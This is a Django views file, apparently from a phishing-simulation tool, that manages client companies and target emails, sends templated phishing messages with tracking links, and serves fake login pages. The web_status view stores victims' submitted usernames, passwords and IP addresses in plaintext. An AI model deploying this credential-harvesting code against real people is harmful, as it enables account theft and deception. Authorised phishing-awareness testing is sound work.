from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from django.contrib.auth import logout
from django.contrib import messages # Allows to send error messages
from .models import Empresas, Correos, Plantillas, Intentos, Status_Mail, Status_Web
from .forms import EmpresaForm, CorreoForm, DeleteForm, PhishingForm, PlantillaForm
from .emails import enviar
from datetime import datetime


 ####     CLIENTES       #####


@login_required(login_url='/accounts/login/')
def clientes(request, id=None):    
    if id != 'AÑADA CLIENTES':
        empresa = Empresas.objects.filter(id = id)[0]
        data = {
            'empresas' : Empresas.objects.all(),
            'empresa_actual' : Empresas.objects.filter(id = id)[0],
            'correos' : Correos.objects.filter(empresa__id= empresa.id),
            'intentos' :Intentos.objects.filter(correo__empresa__id = empresa.id),
            'plantillas' : Plantillas.objects.all(),
            'form_empresa' : EmpresaForm(),
            'form_correo' : CorreoForm(),
            'form_delete' : DeleteForm,
            'form_phishing' : PhishingForm(),
            'opcion' : 'CLIENTES',
            'op' : 'SI'
        }
    else:

        data = {

            'empresas' : Empresas.objects.all(),
            'plantillas' : Plantillas.objects.all(),
            'form_empresa' : EmpresaForm(),
            'form_correo' : CorreoForm(),
            'form_delete' : DeleteForm,
            'form_phishing' : PhishingForm(),
            'opcion' : 'CLIENTES',
            'op' : 'AÑADA CLIENTES'
        }

    return render(request, 'frontend/index.html', data)

@login_required(login_url='/accounts/login/')
def crear_empresa(request):

    empresaForm = EmpresaForm(request.POST)
    if empresaForm.is_valid():
        empresa = Empresas.objects.create(nombre=request.POST['nombre']).id
        messages.add_message(request, messages.SUCCESS, 'Cliente creado correctamente')

    return redirect('clientes', empresa)


@login_required(login_url='/accounts/login/')
def crear_correo(request, id=None):
    correoForm = CorreoForm(request.POST)
    empresa = Empresas.objects.filter(id = id)
    if correoForm.is_valid():
        Correos.objects.create(correo=request.POST['correo'], empresa=empresa[0])
        messages.add_message(request, messages.SUCCESS, 'Correo creado correctamente')

    return redirect('clientes', empresa[0].id)


@login_required(login_url='/accounts/login/')
def borrar_empresa(request, id=None):
    if request.POST['delete'] == 'delete':
        Empresas.objects.filter(id = id).delete()
        messages.add_message(request, messages.SUCCESS, 'Cliente eliminado correctamente')
    else:
        messages.add_message(request, messages.ERROR, 'El mensaje de confirmación debe de ser "delete"')
    return redirect('index-menu', 'CLIENTES')


@login_required(login_url='/accounts/login/')
def borrar_correo(request, id=None):
    deleted = False

    correoObj = Correos.objects.filter(id = id)
    empresa = correoObj[0].empresa.id
    if request.POST['delete'] == 'delete':
        correoObj.delete()
        deleted = True
        messages.add_message(request, messages.SUCCESS, 'Correo eliminado correctamente')
    else:
        messages.add_message(request, messages.ERROR, 'El mensaje de confirmación debe de ser "delete"')

    return redirect('clientes', empresa)

@login_required(login_url='/accounts/login/')
def cambiar_nombre_empresa(request, id=None):
    empresaForm = EmpresaForm(request.POST)
    if empresaForm.is_valid():
        nombre = request.POST['nombre']
        Empresas.objects.filter(id=id).update(nombre=nombre)
        messages.add_message(request, messages.SUCCESS, 'Se ha cambiado el nombre correctamente')
    else:
        messages.add_message(request, messages.ERROR, 'Hay un error')
        
    return redirect('clientes', id)


####     PHISHING       #####


@login_required(login_url='/accounts/login/')
def phishing(request, id=None):
    if request.POST['phishing'] == 'phishing':

        servicio = Plantillas.objects.filter(id = request.POST['servicio'])
        status_mail = Status_Mail.objects.create()
        status_web = Status_Web.objects.create()
        correo = Correos.objects.filter(id=id)[0]

        Intentos.objects.create(
                servicio = Plantillas.objects.filter(servicio=servicio[0].servicio)[0],
                mail_status_id = Status_Mail.objects.filter(id=status_mail.id)[0],
                web_status_id = Status_Web.objects.filter(id=status_web.id)[0],
                correo = Correos.objects.filter(id=id)[0],
        )

        print('http://localhost:8000/status/'+str(status_mail.id))
        print('http://localhost:8000/logins/'+str(status_web.id)+"/"+str(servicio[0].servicio))
        # hay que añadir estas dos lineas al cuerpo del mensaje
        link_status = 'http://localhost:8000/status/'+str(status_mail.id)
        link_login = 'http://localhost:8000/logins/'+str(status_web.id)+"/"+str(servicio[0].servicio)
        enviar(servicio[0].email, servicio[0].password, correo, servicio[0].asunto, servicio[0].mensaje, link_status, link_login)
        empresa = Correos.objects.filter(id=id)[0].empresa.id

    return redirect('clientes', empresa)


#@login_required(login_url='/accounts/login/')
def web_status(request, servicio=None, intweb=None):

    data = {
        'servicio' : servicio,
        'intweb' : intweb,
    }

    if request.method == 'GET':

        x = Intentos.objects.filter(web_status_id__id=intweb)[0]
        if x.web_status_id.num_open < 1 and servicio == x.servicio.servicio:
            Status_Web.objects.filter(id=x.web_status_id.id).update(status = True)
            Status_Web.objects.filter(id=x.web_status_id.id).update(num_open = x.web_status_id.num_open + 1)
            Status_Web.objects.filter(id=x.web_status_id.id).update(fecha = datetime.now())

            return render(request, 'logins/'+servicio+'.html', data)
            

        return redirect('not-found')

    if request.method == 'POST':

        usuario = request.POST['usuario']
        contraseña = request.POST['contraseña']       
        Intentos.objects.filter(web_status_id__id=intweb).update(usuario = usuario)
        Intentos.objects.filter(web_status_id__id=intweb).update(contraseña = contraseña)
        Intentos.objects.filter(web_status_id__id=intweb).update(ip = request.META.get('REMOTE_ADDR'))
        data = {
            'usuario': usuario,
            'contraseña': contraseña,
            'servicio': servicio,
            'ip': request.META.get('REMOTE_ADDR')
        }

        return render(request, 'logins/aviso.html', data)


#@login_required(login_url='/accounts/login/')
def mail_status(request, intmail=None):

    x = Intentos.objects.filter(mail_status_id__id=intmail)[0]
    Status_Mail.objects.filter(id=x.mail_status_id.id).update(status = True)
    Status_Mail.objects.filter(id=x.mail_status_id.id).update(num_open = x.mail_status_id.num_open + 1)
    Status_Mail.objects.filter(id=x.mail_status_id.id).update(fecha = datetime.now())

    return render(request, 'imagenes/logos.html')




#### SERVICIOS ####


@login_required(login_url='/accounts/login/')
def servicios_menu(request, op=None):

    mensaje = ''
        # 1: Error, 2: Exito, 3:Neutral
    idMensaje = 2
    if op == 'PLANTILLAS':

        
        plantillas = Plantillas.objects.all()
        data = {
            'form_plantilla' : PlantillaForm(),
            'form_delete' : DeleteForm(),
            'plantillas': plantillas,
            'opcion' : 'SERVICIOS',
            'op' : 'PLANTILLAS',
            'mensaje' : mensaje,
            'idMensaje' : idMensaje
        }
            
        return render(request, 'frontend/index.html', data)

    elif op == 'MALWARE':

        # malware = Malware.objects.all()
        malware = []
        data = {
            'form_plantilla' : PlantillaForm(),
            'form_delete' : DeleteForm(),
            'malware': malware,
            'opcion' : 'SERVICIOS',
            'op' : 'MALWARE',
            'mensaje' : mensaje,
            'idMensaje' : idMensaje
        }
            
        return render(request, 'frontend/index.html', data)

    else:
        op = 'PLANTILLAS'
        return redirect('servicios-menu', op)


@login_required(login_url='/accounts/login/')
def crear_plantilla(request):

    plantilla = PlantillaForm(request.POST)
    if plantilla.is_valid():
        plantilla.save()
        messages.add_message(request, messages.SUCCESS, 'Se ha creado la plantilla correctamente')
        op = 'PLANTILLAS'
        return redirect('servicios-menu', op)
    op = 'PLANTILLAS'
    return redirect('servicios-menu', op)


@login_required(login_url='/accounts/login/')
def editar_plantilla(request, id=None):

    servicio = request.POST['servicio']
    email = request.POST['email']
    password = request.POST['password']
    asunto = request.POST['asunto']
    mensaje = request.POST['mensaje']

    Plantillas.objects.filter(id=id).update(servicio=servicio)
    Plantillas.objects.filter(id=id).update(email=email)
    Plantillas.objects.filter(id=id).update(password=password)
    Plantillas.objects.filter(id=id).update(asunto=asunto)
    Plantillas.objects.filter(id=id).update(mensaje=mensaje)
    op = 'PLANTILLAS'
    messages.add_message(request, messages.SUCCESS, 'Se ha editado la plantilla correctamente')

    return redirect('servicios-menu',op)


@login_required(login_url='/accounts/login/')
def eliminar_plantilla(request, id=None):

    if request.POST['delete'] == 'delete':
        Plantillas.objects.filter(id=id).delete()
        op = 'PLANTILLAS'
        messages.add_message(request, messages.SUCCESS, 'Se ha eliminado la plantilla correctamente')
        return redirect('servicios-menu', op)
    else:
        messages.add_message(request, messages.ERROR, 'El mensaje de confirmación debe ser "delete"')
    op = 'PLANTILLAS'
    return redirect('servicios-menu', op)  



#### OPCIONES ####


@login_required(login_url='/accounts/login/')
def opciones_menu(request, op=None):

    mensaje = ''
        # 1: Error, 2: Exito, 3:Neutral
    idMensaje = 2
    if op == 'USUARIO':

        data = {
            'opcion' : 'OPCIONES',
            'op' : 'USUARIO',
            'mensaje' : mensaje,
            'idMensaje' : idMensaje
        }
            
        return render(request, 'frontend/index.html', data)

    elif op == 'DASHBOARD':

        data = {
            'opcion' : 'OPCIONES',
            'op' : 'DASHBOARD',
            'mensaje' : mensaje,
            'idMensaje' : idMensaje
        }


        return render(request, 'frontend/index.html', data)

    else:
        op = 'USUARIO'
        return redirect('servicios-menu', op)



#### SETTINGS ####


@login_required(login_url='/accounts/login/')
def index(request):
    return render(request, 'frontend/index.html')


@login_required(login_url='/accounts/login/')
def index_menu(request, opcion=None):

    if opcion == 'CLIENTES':

        try: 

            id = Empresas.objects.all()[0].id
            return redirect('clientes', id)
        except:
            op = 'AÑADA CLIENTES'
            return redirect('clientes', op)

        

    elif opcion == 'SERVICIOS':
        op = 'PLANTILLAS'
        return redirect('servicios-menu', op)
    elif opcion == 'OPCIONES':
        op = 'USUARIO'
        return redirect('opciones-menu', op)


    return redirect('index')


@login_required(login_url='/accounts/login/')
def not_found(request):
    return render(request, 'frontend/404.html')


@login_required(login_url='/accounts/login/')
def logout_view(request):
    logout(request)
    return redirect('login')

def error_handler(request, status):
    if status == 'OK':
        mensaje = 2
        return render(request, mensaje)
    elif status == 'WARNING':
        mensaje = 3
        return render(request, mensaje)
    elif status == 'ERROR':
        mensaje = 1
        return render(request, mensaje)
